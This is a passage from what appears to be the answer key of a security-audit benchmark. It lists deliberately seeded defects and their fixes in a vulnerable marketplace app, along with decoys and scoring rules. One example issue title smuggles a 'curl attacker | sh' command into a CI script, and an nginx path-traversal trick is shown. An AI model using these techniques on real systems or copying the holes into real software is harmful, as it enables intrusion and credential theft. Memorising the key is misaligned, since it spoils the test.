user and grants roles. OWASP A07:2025 · CWE-345.

## VFS-SEC-01 — Search admin key committed in the production env file

```defect
id:       VFS-SEC-01
file:     web/.env.production
line:     3
severity: high
command:  /security-audit
class:    secrets/committed-credential
anchor:   VITE_SEARCH_ADMIN_KEY=marketly-search-admin-2024
match:    secret|credential|admin.?key|api.?key|\bkey\b|committed|hard.?cod|leak|expos
```

The write key for the search cluster is in version control, so it is in every clone and
in history after any later removal. Rotate it, move it to the deploy environment, and keep
it out of `VITE_*` entirely (VFS-XSS-06). OWASP A04:2025 · CWE-798.

## VFS-SEC-02 — Registry token persisted in the runtime image

```defect
id:       VFS-SEC-02
file:     api/Dockerfile
line:     19
severity: high
command:  /security-audit
class:    secrets/secret-in-image
anchor:   ENV NPM_TOKEN=${NPM_TOKEN}
match:    NPM_TOKEN|token|secret|credential|baked|image (layer|metadata|config|histor)|docker (inspect|history)|build.?arg
```

The build stage passes the registry token as a BuildKit secret — correctly. The runtime
stage re-declares it as `ARG` + `ENV`, which bakes it into the image config: `docker
inspect` on any pulled image prints it, and it is set in the environment of every running
pod (and of VFS-DATA-03's dump). OWASP A04:2025 · CWE-522.

## VFS-IAC-01 — Container runs as root

```defect
id:       VFS-IAC-01
file:     api/Dockerfile
line:     27
severity: medium
command:  /security-audit
class:    infra/container-root
anchor:   CMD ["node", "dist/main.js"]
match:    \broot\b|\bUSER\b|non.?root|unprivileged|\buid\b
```

The runtime stage never sets `USER`, so the API — and every command VFS-INJ-04/05/06/07/09
reach — runs as uid 0 with write access to `/app/dist`. The `node` image ships a `node`
user; `USER node` after the `mkdir` is the fix. OWASP A02:2025 · CWE-250.

## VFS-IAC-02 — Postgres published on all interfaces with the default password

```defect
id:       VFS-IAC-02
file:     docker-compose.yml
line:     12
severity: high
command:  /security-audit
class:    infra/exposed-datastore
anchor:   - "5432:5432"
match:    5432|0\.0\.0\.0|all interfaces|expos|publish|bound to|\bbind|default (password|credential)|weak (password|credential)|POSTGRES_PASSWORD|password.{0,10}postgres
```

`"5432:5432"` binds every host interface, and the superuser password is `postgres`. On a
laptop on café Wi-Fi, or a CI box with a public IP, the database is one login away. The
`web` service in the same file binds `127.0.0.1:8080` — the db does not.
OWASP A02:2025 · CWE-1188.

## VFS-IAC-03 — GitHub Actions script injection from the issue title

```defect
id:       VFS-IAC-03
file:     .github/workflows/issue-triage.yml
line:     19
severity: high
command:  /security-audit
class:    ci/script-injection
anchor:   title="${{ github.event.issue.title }}"
match:    script injection|command injection|shell injection|expression injection|injection|github\.event\.issue\.title|issue title|untrusted (input|context)|interpolat
```

`${{ }}` is substituted into the script text before bash parses it. An issue titled
`"; curl attacker | sh; echo "` runs on the runner with an `issues: write` token, opened
by anyone with a GitHub account. Pass the title through `env:` and quote `"$TITLE"`.
OWASP A03:2025 · CWE-78.

## VFS-IAC-04 — `pull_request_target` checks out and builds the fork's code

```defect
id:       VFS-IAC-04
file:     .github/workflows/pr-preview.yml
line:     20
severity: critical
command:  /security-audit
class:    ci/pwn-request
anchor:   ref: ${{ github.event.pull_request.head.sha }}
match:    pull_request_target|pwn.?request|head\.sha|head ref|untrusted (code|pr|fork)|\bfork|checkout.{0,40}(pr|head|untrusted)
```

`pull_request_target` runs with the base repository's secrets, a write token and the `preview`
environment. `actions/checkout@v4` now resolves to v4.4.0 (2026-07-20), which refuses a **fork**
PR's head under `pull_request_target` unless `allow-unsafe-pr-checkout: true`
(`finding-verification.md` § 4 CIP6), so the fork path is closed at this pin; an older SHA pin or
that input reopens it. The defect still holds at critical through two paths the block never
covers: a PR from a **same-repo branch** is checked out, `npm ci` / `npm run build` run its install
scripts and build config, and the next step hands `PREVIEW_DEPLOY_TOKEN` to that workspace; and
`setup-node` with `cache: npm` saves a cache in the default-branch scope that later privileged
runs restore (`ci-security-scan` § 5). Build on `pull_request`, deploy from a separate
`workflow_run` job that never executes PR code and restores no cache a PR wrote. Detector:
`ci-security-scan` § 1 (dispatched by `iac-scan` § 5). OWASP A03:2025 · CWE-829.

## VFS-IAC-05 — nginx alias traversal (missing trailing slash)

```defect
id:       VFS-IAC-05
file:     deploy/nginx/nginx.conf
line:     54
severity: high
command:  /security-audit
class:    infra/proxy-alias-traversal
anchor:   location /uploads {
match:    \balias\b|traversal|off.by.slash|trailing slash|\.\./|uploads\.\.
```

`location /uploads` (no slash) with `alias …/uploads/` (slash) maps `/uploads../x` to
`/srv/marketly/uploads/../x`. The mounted `/srv/marketly` also holds `attachments/` (paid
digital goods) and `exports/` (other sellers' CSVs), so both are downloadable
unauthenticated. Make the location `/uploads/`. OWASP A02:2025 · CWE-22.

## VFS-IAC-06 — nginx advertises its exact version

```defect
id:       VFS-IAC-06
file:     deploy/nginx/nginx.conf
line:     12
severity: low
command:  /security-audit
class:    infra/version-disclosure
anchor:   server_tokens on;
match:    server_tokens|version.{0,20}(disclos|leak|expos|banner|header)|banner|fingerprint|server header
```

`server_tokens on` puts the nginx version in every `Server` header and error page, which
turns version-specific CVE matching into a one-request job. `server_tokens off`.
OWASP A02:2025 · CWE-200.

## VFS-IAC-07 — API pod runs privileged

```defect
id:       VFS-IAC-07
file:     deploy/k8s/api-deployment.yaml
line:     34
severity: high
command:  /security-audit
class:    infra/privileged-container
anchor:   privileged: true
match:    privileged|securityContext|capabilit|host (access|escape|root)|container escape|escalat|allowPrivilegeEscalation|runAsNonRoot
```

`privileged: true` gives the container every capability and the host's devices. Combined
with any of the RCEs above it is a node compromise, not a pod compromise. The comment's
ImageMagick problem is a policy file, not a privilege; drop to `runAsNonRoot`,
`allowPrivilegeEscalation: false`, `capabilities: drop: [ALL]`.
OWASP A02:2025 · CWE-250.

---

## Decoys — must NOT be reported

Each decoy is the correct sibling of a seeded defect: same file or same feature, same
vocabulary, no vulnerability. A run that reports one has produced a false positive **by
construction** — the only precision figure this harness can state without a human
triaging every unmatched finding.

How they score (`score.py`, § DECOYS in its header): a finding that names the decoy's file,
cites a line within the tolerance window of the decoy's line, and matches every one of the
decoy's `match:` patterns is **pinned** to it. A pinned finding is removed before defect
assignment — it can never be credited as a detection — and is reported as `DECOYS FLAGGED
k/6`. A finding with no line is never pinned, and a finding a seeded defect could claim at
EXACT strength is never pinned. Every decoy sits more than 12 lines from any defect in its
file, which `--verify` enforces, so the two windows never overlap.

| id | file:line | looks like | why it is safe |
|----|-----------|-----------|----------------|
| VFS-DECOY-01 | `api/src/products/products.service.ts:57` | VFS-INJ-01 | Prisma's tagged `$queryRaw` sends every `${}` as a bound parameter |
| VFS-DECOY-02 | `api/src/media/downloads.controller.ts:56` | VFS-FILE-01 | `resolve` then `startsWith(root + sep)` before any read |
| VFS-DECOY-03 | `web/src/pages/ProductPage.tsx:64` | VFS-XSS-01 | review HTML passes through `DOMPurify.sanitize` |
| VFS-DECOY-04 | `api/src/webhooks/webhooks.controller.ts:59` | VFS-DATA-07 | length check + `timingSafeEqual` on decoded digests |
| VFS-DECOY-05 | `api/src/media/remote-image.service.ts:40` | VFS-SSRF-01 | `https:` only, exact-host allow-list, `redirect: 'error'` |
| VFS-DECOY-06 | `api/src/media/thumbnail.service.ts:36` | VFS-INJ-04 | `execFile`, fixed binary, argument array, UUID-checked server paths |

```decoy
id:       VFS-DECOY-01
file:     api/src/products/products.service.ts
line:     57
command:  /security-audit
class:    decoy/parameterized-raw-query
anchor:   this.prisma.$queryRaw<ProductRow[]>
match:    sql.{0,3}inject|sqli\b|injection|queryRaw|interpolat|concatenat|unparameteri|not parameteri
```

```decoy
id:       VFS-DECOY-02
file:     api/src/media/downloads.controller.ts
line:     56
command:  /security-audit
class:    decoy/contained-download
anchor:   const target = resolve(root, String(file ?? ''));
match:    traversal|\.\./|dot.?dot|\blfi\b|arbitrary file|outside.{0,30}(root|director|base)|path\.(join|resolve)
```

```decoy
id:       VFS-DECOY-03
file:     web/src/pages/ProductPage.tsx
line:     64
command:  /security-audit
class:    decoy/sanitized-html
anchor:   DOMPurify.sanitize(review.bodyHtml)
match:    xss|cross.site script|dangerouslySetInnerHTML|innerHTML|sanitiz|DOMPurify|html injection
```

```decoy
id:       VFS-DECOY-04
file:     api/src/webhooks/webhooks.controller.ts
line:     59
command:  /security-audit
class:    decoy/constant-time-compare
anchor:   timingSafeEqual(given, expected)
match:    timing|constant.?time|timingSafeEqual|side.?channel|length (check|leak)|early.?(exit|return)
```

```decoy
id:       VFS-DECOY-05
file:     api/src/media/remote-image.service.ts
line:     40
command:  /security-audit
class:    decoy/allowlisted-fetch
anchor:   const res = await fetch(url, { redirect: 'error'
match:    ssrf|server.side request|internal (network|host|service|address)|metadata|169\.254|private (ip|range|address)|dns.?rebind|redirect
```

```decoy
id:       VFS-DECOY-06
file:     api/src/media/thumbnail.service.ts
line:     36
command:  /security-audit
class:    decoy/exec-file-array
anchor:   await runFile('cwebp'
match:    command injection|os.command|shell|inject|\bexec|remote code|\brce\b
```
